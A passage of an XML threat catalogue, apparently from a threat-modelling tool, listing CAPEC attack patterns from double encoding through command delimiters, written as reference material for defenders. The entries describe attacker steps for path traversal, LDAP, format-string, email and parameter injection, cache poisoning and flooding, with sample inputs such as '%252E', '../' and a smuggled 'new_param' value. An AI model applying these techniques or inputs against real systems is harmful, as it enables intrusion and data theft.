  <description>The attacker utilizes a repeating of the encoding process for a set of characters (that is, character encoding a character encoding of a character) to obfuscate the payload of a particular request. The may allow the attacker to bypass filters that attempt to detect illegal characters or strings, such as might be used in traversal or injection attacks. Filters may be able to catch illegal encoded strings but may not catch doubly encoded strings. For example, a dot (.), often used in path traversal attacks and therefore often blocked by filters, could be URL encoded as %2E. However, many filters recognize this encoding and would still block the request. In a double encoding, the % in the above URL encoding would be encoded again as %25, resulting in %252E which some filters might not catch, but which could still be interpreted as a dot (.) by interpreters on the target.Try double-encoding for parts of the input in order to try to get past the filters. For instance, by double encoding certain characters in the URL (e.g. dots and slashes) an attacker may try to get access to restricted resources on the web server or force browse to protected pages (thus subverting the authorization service). An attacker can also attempt other injection style attacks using this attack pattern: command injection, SQL injection, etc.</description>
</threat>
<threat label="CAPEC-121" name="Locate and Exploit Test APIs" type="Standard" reference="CAPEC">
  <description>An attacker exploits a sample, demonstration, or test API that is insecure by default and should not be resident on production systems. Some applications include APIs that are intended to allow an administrator to test and refine their domain. These APIs should usually be disabled once a system enters a production environment. Testing APIs may expose a great deal of diagnostic information intended to aid an administrator, but which can also be used by an attacker to further refine their attack. Moreover, testing APIs may not have adequate security controls or may not have undergone rigorous testing since they were not intended for use in production environments. As such, they may have many flaws and vulnerabilities that would allow an attacker to severely disrupt a target.</description>
</threat>
<threat label="CAPEC-122" name="Exploitation of Authorization" type="Standard" reference="CAPEC">
  <description>An attacker is able to exploit features of the target that should be reserved for privileged users or administrators but are exposed to use by lower or non-privileged accounts. Access to sensitive information and functionality must be controlled to ensure that only authorized users are able to access these resources. If access control mechanisms are absent or misconfigured, a user may be able to access resources that are intended only for higher level users. An attacker may be able to exploit this to utilize a less trusted account to gain information and perform activities reserved for more trusted accounts. This attack differs from privilege escalation and other privilege stealing attacks in that the attacker never actually escalates their privileges but instead is able to use a lesser degree of privilege to access resources that should be (but are not) reserved for higher privilege accounts. Likewise, the attacker does not exploit trust or subvert systems - all control functionality is working as configured but the configuration does not adequately protect sensitive resources at an appropriate level.</description>
</threat>
<threat label="CAPEC-123" name="Buffer Attacks" type="Standard" reference="CAPEC">
  <description>An attacker manipulates a data buffer to change the execution flow of a process to a sequence of events the attacker controls. Data buffers in software applications provide a storage-space for external input. Buffer attacks provide input the buffer cannot correctly handle. Buffer attacks are distinguished in that it is the buffer space itself that is the target of the attack rather than any code responsible for interpreting the content of the buffer. In virtually all buffer attacks the content that is placed in the buffer by the user is immaterial. Instead, most buffer attacks involve providing more input than the buffer can store, resulting in the overwriting of other program memory or even the program stack with user supplied input.</description>
</threat>
<threat label="CAPEC-124" name="Attack through Shared Data" type="Standard" reference="CAPEC">
  <description>An attacker exploits a data structure shared between multiple applications or an application pool to affect application behavior. Data may be shared between multiple applications or between multiple threads of a single application. Data sharing is usually accomplished through mutual access to a single memory location. If an attacker can manipulate this shared data (usually by co-opting one of the applications or threads) the other applications or threads using the shared data will often continue to trust the validity of the compromised shared data and use it in their calculations. This can result in invalid trust assumptions, corruption of additional data through the normal operations of the other users of the shared data, or even cause a crash or compromise of the sharing applications.</description>
</threat>
<threat label="CAPEC-125" name="Resource Depletion through Flooding" type="Standard" reference="CAPEC">
  <description>An attacker consumes the resources of a target by rapidly engaging in a large number of interactions with the target. This type of attack generally exposes a weakness in rate limiting or flow control in management of interactions. Since each request consumes some of the target's resources, if a sufficiently large number of requests must be processed at the same time then the target's resources can be exhausted.The degree to which the attack is successful depends upon the volume of requests in relation to the amount of the resource the target has access to, and other mitigating circumstances such as the target's ability to shift load or acquired additional resources to deal with the depletion. The more protected the resource and the greater the quantity of it that must be consumed, the more resources the attacker may need to have at their disposal. A typical TCP/IP flooding attack is a Distributed Denial-of-Service attack where many machines simultaneously make a large number of requests to a target. Against a target with strong defenses and a large pool of resources, many tens of thousands of attacking machines may be required.When successful this attack prevents legitimate users from accessing the service and can cause the target to crash. This attack differs from resource depletion through leaks or allocations in that the latter attacks do not rely on the volume of requests made to the target but instead focus on manipulation of the target's operations. The key factor in a flooding attack is the number of requests the attacker can make in a given period of time. The greater this number, the more likely an attack is to succeed against a given target.</description>
</threat>
<threat label="CAPEC-127" name="Directory Indexing" type="Standard" reference="CAPEC">
  <description>An attacker crafts a request to a target that results in the target listing/indexing the content of a directory as output. One common method of triggering directory contents as output is to construct a request containing a path that terminates in a directory name rather than a file name since many applications are configured to provide a list of the directory's contents when such a request is received. An attacker can use this to explore the directory tree on a target as well as learn the names of files. This can often end up revealing test files, backup files, temporary files, hidden files, configuration files, user accounts, script contents, as well as naming conventions, all of which can be used by an attacker to mount additional attacks.Use a method, either manual, scripted, or automated to discover the directories on the server by making requests for directories that may possibly exist. During this phase the attacker is less concerned with whether a directory can be accessed or indexed and more focused on simply discovering what directories do exist on the target.Send requests to the web server for common directory namesIf directories are discovered that are native to a server type further refine the direcory search to include directories usually present on those types of servers.Search for uncommon or potentially user created directories that may be present.ACLs or other access control mechanisms are present in the application or server configuration that indicate the existence of the directory but the attacker lacks the proper authorization to access the directory (HTTP Status Code 401)ACLs or other access control mechanisms are present in the application or server configuration that indicate the existence of the directory, but access is forbidden and authorization will not help. (HTTP Status Code 403)The directory exists and can be accessed. HTTP Status Code 200 is the standard code for a successful requestThe directory may or may not exist because the server is redirecting the user to another location. HTTP Status codes 301 or 302 indicate the server configuration is redirecting the user to some other page or directory.It cannot be automatically assumed that the location to which the attacker is redirected is the requested directory located elsewhere.The attacker attempts to access the discovered directories that allow access and may attempt to bypass server or application level ACLs by using manual or automated methodsUse a scanner tool to dynamically add directories/files to include their scan based upon data obtained in initial probes.Use a browser to manually explore the website by issuing a request ending the URL in a slash '/'.Attempt to bypass ACLs on directories by using methods that known to work against some server types by appending data to the directory request. For instance, appending a Null byte to the end of the request which may cause an ACL to fail and allow access.Sequentially request a list of common base files to each directory discovered.Try multiple fuzzing techniques to list directory contents for directories that will not reveal their contents with a &quot;/&quot; requestThere are no normal base files (index.html /home.html /default.html /default.asp /default.asp / index.php) at present“File not found” error messages along with invalid path name.The website automatically redirects to the base file. Note that the attacker may still be able to explore the directory listings.Error 403 Forbidden message displays. The access to directory indexing is blocked by the web server.The attacker attempts to access the discovered directories that allow access and may attempt to bypass server or application level ACLs by using manual or automated methodsTry multiple exploit techniques to list directory contents for directories that will not reveal their contents with a &quot;/&quot; requestTry other known exploits to evelate privileges sufficient to bypass protected directories.List the files in the directory by issuing a request with the URL ending in a “/” slash.Accessthe files via direct URL and capture contents.Attempt to bypass ACLs on directories by using methods that are known to work against some server types by appending data to the directory request. For instance, appending a Null byte to the end of the request which may cause an ACL to fail and allow access.Sequentially request a list of common base files to each directory discovered.A request for the directory name yields a directory listingEither an application or server exploit yields a directory listingErrors 401 or 403 indicate access to directory indexing is blocked by the web server and all methods tried have yielded no success to bypass the ACL or elevate the attackers privileges.</description>
</threat>
<threat label="CAPEC-128" name="Integer Attacks" type="Standard" reference="CAPEC">
  <description>An attacker takes advantage of the structure of integer variables to cause these variables to assume values that are not expected by an application. For example, adding one to the largest positive integer in a signed integer variable results in a negative number. Negative numbers may be illegal in an application and the application may prevent an attacker from providing them directly, but the application may not consider that adding two positive numbers can create a negative number do to the structure of integer storage formats.</description>
</threat>
<threat label="CAPEC-129" name="Pointer Attack" type="Standard" reference="CAPEC">
  <description>This attack involves an attacker manipulating a pointer within a target application resulting in the application accessing an unintended memory location. This can result in the crashing of the application or, for certain pointer values, access to data that would not normally be possible or the execution of arbitrary code. Since pointers are simply integer variables, Integer Attacks may often be used in Pointer Attacks.</description>
</threat>
<threat label="CAPEC-13" name="Subverting Environment Variable Values" type="Standard" reference="CAPEC">
  <description>The attacker directly or indirectly modifies environment variables used by or controlling the target software. The attacker's goal is to cause the target software to deviate from its expected operation in a manner that benefits the attacker.The attacker probes the application for information. Which version of the application is running? Are there known environment variables? etc.The attacker gains control of an environment variable and ties to find out what process(es) the environment variable controls.The attacker modifies the environment variable to abuse the normal flow of processes or to gain access to privileged ressources.An attacker can intentionally modify the client side parameter and monitor how the server behaves in response to that modification. For instance an attacker will look at the cookie data, the URL parameters, the hidden variables in forms, variables used in system calls, etc.If the client uses a program in binary format to connect to the server, disassembler can be used to identify parameter within the binary code, and then the attacker would try to simulate the client application and change some of the parameters sent to the server. For instance the attacker may find that a secret key or a path is hard coded in the binary client application.Environment variables are frequently stored in cleartext configuration files. If the attacker can modify those configuration files, he can control the environment variables. Even a read access can potentially be dangerous since this may give sensitive information to perform this type of attack. Indeed knowing which environment variables the application uses is a prerequisite to this type of attack.The attacker may try to obfuscate its attempts to subvert the target process (such as authentication) by using valid values for the variable she controls. By using valid values the user tries to understand the authentication mechanism. This would be in preparation to a more serious attack.Consuming an attacker contolled parameter can defeat the normal process of the application.</description>
</threat>
<threat label="CAPEC-130" name="Resource Depletion through Allocation" type="Standard" reference="CAPEC">
  <description>An attacker causes the target to allocate excessive resources to servicing the attacker's request, thereby reducing the resources available for legitimate services and degrading or denying services. Usually, this attack focuses on memory allocation, but any finite resource on the target could be the attacked, including bandwidth, processing cycles, or other resources. This attack does not attempt to force this allocation through a large number of requests (that would be Resource Depletion through Flooding) but instead uses one or a small number of requests that are carefully formatted to force the target to allocate excessive resources to service this request(s). Often this attack takes advantage of a bug in the target to cause the target to allocate resources vastly beyond what would be needed for a normal request. For example, using an Integer Attack, the attacker could cause a variable that controls allocation for a request to hold an excessively large value. Excessive allocation of resources can render a service degraded or unavailable to legitimate users and can even lead to crashing of the target.</description>
</threat>
<threat label="CAPEC-131" name="Resource Depletion through Leak" type="Standard" reference="CAPEC">
  <description>An attacker utilizes a resource leak on the target to deplete the quantity of the resource available to service legitimate requests. Resource leaks most often come in the form of memory leaks where memory is allocated but never released after it has served its purpose, however, theoretically, any other resource that can be reserved can be targeted if the target fails to release the reservation when the reserved resource block is no longer needed. In this attack, the attacker determines what activity results in leaked resources and then triggers that activity on the target. Since some leaks may be small, this may require a large number of requests by the attacker. However, this attack differs from a flooding attack in that the rate of requests is generally not significant. This is because the lost resources due to the leak accumulate until the target is reset, usually by restarting it. Thus, a resource-poor attacker who would be unable to flood the target can still utilize this attack.Resource depletion through leak differs from resource depletion through allocation in that, in the former, the attacker may not be able to control the size of each leaked allocation, but instead allows the leak to accumulate until it is large enough to affect the target's performance. When depleting resources through allocation, the allocated resource may eventually be released by the target so the attack relies on making sure that the allocation size itself is prohibitive of normal operations by the target.</description>
</threat>
<threat label="CAPEC-132" name="Symlink Attack" type="Standard" reference="CAPEC">
  <description>An attacker positions a symbolic link in such a manner that the targeted user or application accesses the link's endpoint, assuming that it is accessing a file with the link's name. The endpoint file may be either output or input. If the file is output, the result is that the endpoint is modified, instead of a file at the intended location. Modifications to the endpoint file may include appending, overwriting, corrupting, changing permissions, or other modifications. In some variants of this attack the attacker may be able to control the change to a file while in other cases they cannot. The former is especially damaging since the attacker may be able to grant themselves increased privileges or insert false information, but the latter can also be damaging as it can expose sensitive information or corrupt or destroy vital system or application files. Alternatively, the endpoint file may serve as input to the targeted application. This can be used to feed malformed input into the target or to cause the target to process different information, possibly allowing the attacker to control the actions of the target or to cause the target to expose information to the attacker. Moreover, the actions taken on the endpoint file are undertaken with the permissions of the targeted user or application, which may exceed the permissions that the attacker would normally have.Attacker identifies the target application by determining whether there is sufficient check before writing data to a file and creating symlinks to files in different directories.The attacker writes to files in different directories to check whether the application has sufficient checking before file operations.The attacker creates symlinks to files in different directories.The application does not check whether the file is a symlink or not before writing data to it.The system allows creating symlinks.Some directories do not allow creating symlink.The application checks whether the file is a symlink or not before writing data to it.The attacker then uses a variety of techniques, such as monitoring or guessing to create symlinks to the files accessed by the target application in the directories which are identified in the explore phase.The attacker monitors the file operations performed by the target application using a tool like dtrace or FileMon. And the attacker can delay the operations by using “sleep(2)” and “usleep()” to prepare the appropriate conditions for the attack, or make the application perform expansive tasks (large files parsing, etc.) depending on the purpose of the application.The attacker may need a little guesswork on the filenames on which the target application would operate.The attacker tries to create symlinks to the various filenames.The attacker can create symlinks to the files in the target directories.The attacker is able to create symlinks to sensitives file while the target application is operating on the file.Create the symlink to the sensitive file such as configuration files, etc.</description>
</threat>
<threat label="CAPEC-133" name="Try All Common Application Switches and Options" type="Standard" reference="CAPEC">
  <description>An attacker attempts to invoke all common switches and options in the target application for the purpose of discovering weaknesses in the target. For example, in some applications, adding a --debug switch causes debugging information to be displayed, which can sometimes reveal sensitive processing or configuration information to an attacker. This attack differs from other forms of API abuse in that the attacker is blindly attempting to invoke options in the hope that one of them will work rather than specifically targeting a known option. Nonetheless, even if the attacker is familiar with the published options of a targeted application this attack method may still be fruitful as it might discover unpublicized functionality.</description>
</threat>
<threat label="CAPEC-134" name="Email Injection" type="Standard" reference="CAPEC">
  <description>An attacker manipulates the headers and content of an email message by injecting data via the use of delimeter characters native to the protocol. Many applications allow users to send email messages by filling in fields. For example, a web site may have a link to &quot;share this site with a friend&quot; where the user provides the recipient's email address and the web application fills out all the other fields, such as the subject and body. In this pattern, an attacker adds header and body information to an email message by injecting additional content in an input field used to construct a header of the mail message. This attack takes advantage of the fact that RFC 822 requires that headers in a mail message be separated by a carriage return. As a result, an attacker can inject new headers or content simply by adding a delimiting carriage return and then supplying the new heading and body information. This attack will not work if the user can only supply the message body since a carriage return in the body is treated as a normal character.</description>
</threat>
<threat label="CAPEC-135" name="Format String Injection" type="Standard" reference="CAPEC">
  <description>An attacker includes formatting characters in a string input field on the target application. Most applications assume that users will provide static text and may respond unpredictably to the presence of formatting character. For example, in certain functions of the C programming languages such as printf, the formatting character %s will print the contents of a memory location expecting this location to identify a string and the formatting character %n prints the number of DWORD written in the memory. An attacker can use this to read or write to memory locations or files, or simply to manipulate the value of the resulting text in unexpected ways. Reading or writing memory may result in program crashes and writing memory could result in the execution of arbitrary code if the attacker can write to the program stack.The attacker takes an inventory of the entry points of the application.Spider web sites for all available linksList parameters, external variables, configuration files variables, etc. that are possibly used by the application.Determine the user-controllable input susceptible to format string injection. For each user-controllable input that the attacker suspects is vulnerable to format string injection, attempt to inject formatting characters such as %n, %s, etc.. The goal is to manipulate the string creation using these formatting characters.Inject probe payload which contains formatting characters (%s, %d, %n, etc.) through input parameters.Attacker receives normal response from server.Attacker receives an abnormal message (let’s say with a partial dump of the memory) from the application which indicates that the format string was successfully manipulated.After determining that a given input is vulnerable to format string injection, hypothesize what the underlying usage looks like and the associated constraints.Insert various formatting characters to read or write the memory, e.g. overwrite return address, etc.Probing via format character injection was successful in identifying vulnerable input.Probing via format character injection failed in identifying vulnerable input.</description>
</threat>
<threat label="CAPEC-136" name="LDAP Injection" type="Standard" reference="CAPEC">
  <description>An attacker manipulates or crafts an LDAP query for the purpose of undermining the security of the target. Some applications use user input to create LDAP queries that are processed by an LDAP server. For example, a user might provide their username during authentication and the username might be inserted in an LDAP query during the authentication process. An attacker could use this input to inject additional commands into an LDAP query that could disclose sensitive information. For example, entering a * in the aforementioned query might return information about all users on the system. This attack is very similar to an SQL injection attack in that it manipulates a query to gather additional information or coerce a particular return value.The attacker takes an inventory of the entry points of the application.Spider web sites for all available linksSniff network communications with application using a utility such as WireShark.For each user-controllable input that the attacker suspects is vulnerable to LDAP injection, attempt to inject characters that have special meaning in LDAP (such as a single quote character, etc.). The goal is to create a LDAP query with an invalid syntaxUse web browser to inject input through text fields or through HTTP GET parametersUse a web application debugging tool such as Tamper Data, TamperIE, WebScarab,etc. to modify HTTP POST parameters, hidden fields, non-freeform fields, or other HTTP header.Use modified client (modified by reverse engineering) to inject input.Attacker receives normal response from server.Attacker recieves an error message from target indicating a problem with the LDAP QueryServer sends a specific error message that indicates programmatic parsing of the input data (e.g. NumberFormatException)After determining that a given input is vulnerable to LDAP Injection, hypothesize what the underlying query looks like. Possibly using a tool, iteratively try to add logic to the query to extract information from the LDAP, or to modify or delete information in the LDAP.Add logic to the LDAP query to change the meaning of that command. Automated tools could be used to generate the LDAP injection strings.Use a web application debugging tool such as Tamper Data, TamperIE, WebScarab,etc. to modify HTTP POST parameters, hidden fields, non-freeform fields, or other HTTP header.Attacker receives normal response from server.Probing via LDAP syntax injection was successful in identifying vulnerable input.Probing via LDAP syntax injection failed in identifying vulnerable input.When malicious LDAP content is executed by the LDAP engine, it can lead to arbitrary queries being executed, causing disclosure of information, unauthorized access, privilege escalation and possibly system compromise.</description>
</threat>
<threat label="CAPEC-137" name="Parameter Injection" type="Standard" reference="CAPEC">
  <description>An attacker exploits weaknesses in input validation by manipulating the content of request parameters for the purpose of undermining the security of the target. Some parameter encodings use text characters as separators. For example, parameters in a HTTP GET message are encoded as name-value pairs separated by an ampersand (&amp;). If an attacker can supply text strings that are used to fill in these parameters, then they can inject special characters used in the encoding scheme to add or modify parameters. For example, if user input is fed directly into an HTTP GET request and the user provides the value &quot;myInput&amp;new_param=myValue&quot;, then the input parameter is set to myInput, but a new parameter (new_param) is also added with a value of myValue. This can significantly change the meaning of the query that is processed by the server. Any encoding scheme where parameters are identified and separated by text characters is potentially vulnerable to this attack - the HTTP GET encoding used above is just one example.</description>
</threat>
<threat label="CAPEC-138" name="Reflection Injection" type="Standard" reference="CAPEC">
  <description>An attacker supplies a value to the target application which is then used by reflection methods to identify a class, method, or field. For example, in the Java programming language the reflection libraries permit an application to inspect, load, and invoke classes and their components by name. If an attacker can control the input into these methods including the name of the class/method/field or the parameters passed to methods, they can cause the targeted application to invoke incorrect methods, read random fields, or even to load and utilize malicious classes that the attacker created. This can lead to the application revealing sensitive information, returning incorrect results, or even having the attacker take control of the targeted application.</description>
</threat>
<threat label="CAPEC-139" name="Relative Path Traversal" type="Standard" reference="CAPEC">
  <description>An attacker exploits a weakness in input validation on the target by supplying a specially constructed path utilizing dot and slash characters for the purpose of obtaining access to arbitrary files or resources. An attacker modifies a known path on the target in order to reach material that is not available through intended channels. These attacks normally involve adding additional path separators (/ or \) and/or dots (.), or encodings thereof, in various combinations in order to reach parent directories or entirely separate trees of the target's directory structure.Using a browser or an automated tool, an attacker follows all public links on a web site. He records all the links he finds. He picks out the URL parameters that may related to access to files.Use a spidering tool to follow and record all links. Make special note of any links that include parameters in the URL.Use a proxy tool to record all links visited during a manual traversal of the web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms that are GET method forms rather than POST forms.Use a browser to manually explore the website and analyze how it is constructed. Many browser's plug-in are available to facilitate the analysis or automate the URL discovery.There are links that include parameters in URL.Using URL rewriting, parameters may be part of the URL path.No parameters appear on the URL. Even though none appear, the web application may still use them if they are provided.Applications that have only static pages or that simply present information without accepting input are unlikely to be susceptible.Possibly using an automated tool, an attacker requests variations on the identified inputs. He sends parameters that include variations of payloads.Use a list of probe strings as path traversal payload. Different strings may be used for different platforms. Strings contain relative path sequences such as “../”.Use a proxy tool to record results of manual input of relative path traversal probes in known URLs.Attackers can access arbitrary files.The output of pages includes some error messages if file does not exist.All context-sensitive characters are consistently re-encoded before being sent to the web browser.An attacker injects path traversal syntax into identified vulnerable inputs to cause inappropriate reading, writing or execution of files. An attacker could be able to read directories or files which they are normally not allowed to read. The attacker could also access data outside the web document root, or include scripts, source code and other kinds of files from external websites. Once the attacker accesses arbitrary files, he/she could also modify files. In particular situations, the attacker could also execute arbitrary code or system commands.Manipulate file and its path by injecting relative path sequences (e.g. “../”).Download files, modify files, or try to execute shell commands (with binary files). • Attackers may create or overwrite critical files. • Execute unauthorized code or commands. • Information Leakage of applications that attackers may read confidential files. • Attackers may delete or corrupt some critical files or data that cause denial of service to legal users.</description>
</threat>
<threat label="CAPEC-14" name="Client-side Injection-induced Buffer Overflow" type="Detailed" reference="CAPEC">
  <description>This type of attack exploits a buffer overflow vulnerability in targeted client software through injection of malicious content from a custom-built hostile service.The attacker creates a custom hostile serviceThe attacker acquires information about the kind of client attaching to her hostile service to determine if it contains an exploitable buffer overflow vulnerability.The attacker intentionally feeds malicious data to the client to exploit the buffer overflow vulnerability that she has uncovered.The attacker leverages the exploit to execute arbitrary code or to cause a denial of service.The server may look like a valid server, but in reality it may be a hostile server aimed at fooling the client software. For instance the server can use honey pots and get the client to download malicious code.Once engaged with the client, the hostile server may attempt to scan the client's host for open ports and potential vulnerabilities in the client software.The hostile server may also attempt to install and run malicious code on the client software. That malicious code can be used to scan the client software for buffer overflow.An example of indicator is when the client software crashes after executing code downloaded from a hostile server.The most common are remote code execution or denial of service.</description>
</threat>
<threat label="CAPEC-140" name="Bypassing of Intermediate Forms in Multiple-Form Sets" type="Standard" reference="CAPEC">
  <description>Some web applications require users to submit information through an ordered sequence of web forms. This is often done if there is a very large amount of information being collected or if information on earlier forms is used to pre-populate fields or determine which additional information the application needs to collect. An attacker who knows the names of the various forms in the sequence may be able to explicitly type in the name of a later form and navigate to it without first going through the previous forms. This can result in incomplete collection of information, incorrect assumptions about the information submitted by the attacker, or other problems that can impair the functioning of the application.</description>
</threat>
<threat label="CAPEC-141" name="Cache Poisoning" type="Standard" reference="CAPEC">
  <description>An attacker exploits the functionality of cache technologies to cause specific data to be cached that aids the attackers’ objectives. This describes any attack whereby an attacker places incorrect or harmful material in cache. The targeted cache can be an application's cache (e.g. a web browser cache) or a public cache (e.g. a DNS or ARP cache). Until the cache is refreshed, most applications or clients will treat the corrupted cache value as valid. This can lead to a wide range of exploits including redirecting web browsers towards sites that install malware and repeatedly incorrect calculations based on the incorrect value.Use tools to sniff traffic and scan a network in order to locate application's cache (e.g. a web browser cache) or a public cache (e.g. a DNS or ARP cache) that may have vulnerabilities. Look for poisoning point in cache table entries.Run tools that check available entries in the cache.Entries do not exist in the cache.Applications or servers are not updated to new versions.Entries exist in the cache.An attacker sends bogus request to the target, and then floods responses that trick a cache to remember malicious responses, which are wrong answers of queries.Intercept or modify a query, or send a bogus query with known credentials (such as transaction ID).Request that the attacker intercepts includes transaction ID.The attacker successfully sends response before authorized server.Transaction ID has been randomized.The application or server cache has recorded correct table entry. In this case, the attacker needs to figure out a way to overwrite table entries to succeedThe attacker fails to send responses before authorized responses. In this case, the attacker needs to figure out a way to overwrite table entries to succeedAs the attacker succeeds in exploiting the vulnerability, he is able to manipulate and interpose malicious response data to targeted victim queries.Intercept or modify a query, or send a bogus query with known credentials (such as transaction ID).Man-in-the-Middle intercepts secure communication between two parties.</description>
</threat>
<threat label="CAPEC-142" name="DNS Cache Poisoning" type="Standard" reference="CAPEC">
  <description>A domain name server translates a domain name (such as www.example.com) into an IP address that Internet hosts use to contact Internet resources. An attacker modifies a public DNS cache to cause certain names to resolve to incorrect addresses that the attacker specifies. The result is that client applications that rely upon the targeted cache for domain name resolution will be directed not to the actual address of the specified domain name but to some other address. Attackers can use this to herd clients to sites that install malware on the victim's computer or to masquerade as part of a Pharming attack.Check DNS caches on local DNS server and client’s browser with DNS cache enabled.Run tools that check the resolver cache in the memory to see if it contains a target DNS entry.Figure out if the client’s browser has DNS cache enabled.Found no entry in the resolver cacheThe results show target DNS entry in DNS serverA request is sent to the authoritative server for target website and wait for the iterative name resolver. An attacker sends bogus request to the DNS local server, and then floods responses that trick a DNS cache to remember malicious responses, which are wrong answers of DNS query.Attacker must know the transaction ID by intercepting a DNS query, or sending a bogus query with known transaction ID.If the transaction ID used to identify each query instance is randomized in some new DNS software, the attack must guess the transaction ID. Slow the response of the real DNS server by causing Denial-of-service. This gives attacker enough time to guess transactionAttacker crafts DNS response with the same transaction ID as in the request. The attacker sends out DNS responses before the authorized DNS server. This forces DNS local cache stores fake DNS response (wrong answer). The fake DNS responses usually include a malicious website’s IP address.DNS request that the attacker intercepts includes transaction ID.The attacker successfully sends DNS response before authorized DNS server.Transaction ID has been randomized.The DNS server cache has recorded correct Name and IP address entry. In this case, the attacker needs to figure out a way to overwrite table entries to succeedThe attacker fails to send DNS response before authorized DNS server. In this case, the attacker needs to figure out a way to overwrite table entries to succeedAs the attacker succeeds in exploiting the vulnerability, the victim connects to a malicious site using a good web site’s domain name.Redirecting Web traffic to a site that looks enough like the original so as to not raise any suspicion.Man-in-the-Middle intercepts secure communication between two parties. Any local machine that types names of the good server is redirected to a malicious server. This attack assists pharming attack when victim is fooled into entering sensitive data into supposedly trusted locations. The attacker could also accept the incoming SSL connection, decrypts it, reads all the traffic, and makes the same request via SSL to the original site.</description>
</threat>
<threat label="CAPEC-143" name="Detect Unpublicised Web Pages" type="Standard" reference="CAPEC">
  <description>An attacker searches a targeted web site for web pages that have not been publicized. Generally this involves mapping the published web site by spidering through all the published links and then attempt to access well-known debugging or logging pages, or otherwise predictable pages within the site tree. For example, if an attacker might be able to notice a pattern in the naming of documents and extrapolate this pattern to discover additional documents that have been created but are no longer externally linked. Using this, the attacker may be able to gain access to information that the targeted site did not intend to make public.</description>
</threat>
<threat label="CAPEC-144" name="Detect Unpublicised Web Services" type="Standard" reference="CAPEC">
  <description>An attacker searches a targeted web site for web services that have not been publicized. Generally this involves mapping the published web site by spidering through all the published links and then attempt to access well-known debugging or logging services, or otherwise predictable services within the site tree. This attack can be especially dangerous since unpublished but available services may not have adequate security controls placed upon them given that an administrator may believe they are unreachable.</description>
</threat>
<threat label="CAPEC-145" name="Checksum Spoofing" type="Standard" reference="CAPEC">
  <description>An attacker spoofs a checksum message for the purpose of making a payload appear to have a valid corresponding checksum. Checksums are used to verify message integrity. They consist of some value based on the value of the message they are protecting. Hash codes are a common checksum mechanism. Both the sender and recipient are able to compute the checksum based on the contents of the message. If the message contents change between the sender and recipient, the sender and recipient will compute different checksum values. Since the sender's checksum value is transmitted with the message, the recipient would know that a modification occurred. In checksum spoofing an attacker modifies the message body and then modifies the corresponding checksum so that the recipient's checksum calculation will match the checksum (created by the attacker) in the message. This would prevent the recipient from realizing that a change occurred.</description>
</threat>
<threat label="CAPEC-146" name="XML Schema Poisoning" type="Standard" reference="CAPEC">
  <description>An attacker corrupts or modifies the content of XML schema information passing between client and server for the purpose of undermining the security of the target. XML Schemas provide the structure and content definitions for XML documents. Schema poisoning is the ability to manipulate a schema either by replacing or modifying it to compromise the programs that process documents that use this schema. Possible attacks are denial of service attacks by modifying the Schema so that it does not contain required information for subsequent processing. For example, the unaltered schema may require a @name attribute in all submitted documents. If the attacker removes this attribute from the schema then documents create using the new grammar will lack this field, which may cause the processing application to enter an unexpected state or record incomplete data. In addition, manipulation of the data types described in the schema may affect the results of calculations taken by the document reader. For example, a float field could be changed to an int field. Finally, the attacker may change the encoding defined in the schema for certain fields allowing the contents to bypass filters that scan for dangerous strings. For example, the modified schema might us a URL encoding instead of ASCII, and a filter that catches a semicolon (;) might fail to detect its URL encoding (%3B).</description>
</threat>
<threat label="CAPEC-147" name="XML Ping of the Death" type="Standard" reference="CAPEC">
  <description>An attacker initiates a resource depletion attack where a large number of small XML messages are delivered at a sufficiently rapid rate to cause a denial of service or crash of the target. Transactions such as repetitive SOAP transactions can deplete resources faster than a simple flooding attack because of the additional resources used by the SOAP protocol and the resources necessary to process SOAP messages. The transactions used are immaterial as long as they cause resource utilization on the target. In other words, this is a normal flooding attack augmented by using messages that will require extra processing on the target.Using a browser or an automated tool, an attacker records all instance of web services to process XML requests.Use an automated tool to record all instances of URLs to process XML requests.Use a browser to manually explore the website and analyze how the application processes XML requests.The URL processes XML requests.The application does not accept XML requests.The attacker delivers a large number of small XML messages to the target URLs found in the explore phase at a sufficiently rapid rate. It causes denial of service to the target application.Send a large number of crafted small XML messages to the target URL.Denial of Service</description>
</threat>
<threat label="CAPEC-148" name="Content Spoofing" type="Standard" reference="CAPEC">
  <description>An attacker modifies content to make it contain something other than what the original content producer intended while keeping the apparent source of the content unchanged. The term content spoofing is most often used to describe modification of web pages hosted by a target to display the attacker's content instead of the owner's content. However, any content can be spoofed, including the content of email messages, file transfers, or the content of other network communication protocols. Content can be modified at the source (e.g. modifying the source file for a web page) or in transit (e.g. intercepting and modifying a message between the sender and recipient). Usually, the attacker will attempt to hide the fact that the content has been modified, but in some cases, such as with web site defacement, this is not necessary. Content Spoofing can lead to malware exposure, financial fraud if the content governs financial transactions, privacy violations, and other results.</description>
</threat>
<threat label="CAPEC-149" name="Explore for predictable temporary file names" type="Standard" reference="CAPEC">
  <description>An attacker explores a target to identify the names and locations of predictable temporary files for the purpose of launching further attacks against the target. This involves analyzing naming conventions and storage locations of the temporary files created by a target application. If an attacker can predict the names of temporary files they can use this information to mount other attacks, such as information gathering and symlink attacks.</description>
</threat>
<threat label="CAPEC-15" name="Command Delimiters" type="Standard" reference="CAPEC">
  <description>An attack of this type exploits a programs' vulnerabilities that allows an attacker's commands to be concatenated onto a legitimate command with the intent of targeting other resources such as the file system or database. The system that uses a filter or a blacklist input validation, as opposed to whitelist validation is vulnerable to an attacker who predicts delimiters (or combinations of delimiters) not present in the filter or blacklist. As with other injection attacks, the attacker uses the command delimiter payload as an entry point to tunnel through the application and activate additional attacks through SQL queries, shell commands, network scanning, and so on.In situations where the runtime environment is not implicitly known, the attacker makes connections to the target system and tries to determine the system's runtime environment. Knowing the environment is vital to choosing the correct delimiters.Port mapping using network connection-based software (e.g., nmap, nessus, etc.)Port mapping by exploring the operating system (netstat, sockstat, etc.)TCP/IP FingerprintingInduce errors to find informative error messagesThe target software accepts connections via the network.The attacker surveys the target application, possibly as a valid and authenticated userSpidering web sites for all available linksInventory all application inputsAttacker develops a list of valid inputsThe attacker systematically attempts variations of delimiters on known inputs, observing the application's response each time.Inject command delimiters using network packet injection tools (netcat, nemesis, etc.)Inject command delimiters using web test frameworks (proxies, TamperData, custom programs, etc.)Enter command delimiters directly in input fields.Attack step 2 is successful.The attacker uses combinations of payload and carefully placed command delimiters to attack the software.Enables attacker to execute server side code with any commands that the program owner has privileges to.</description>
</threat>
<threat label="CAPEC-150" name="Common resource location exploration" type="Standard" reference="CAPEC">
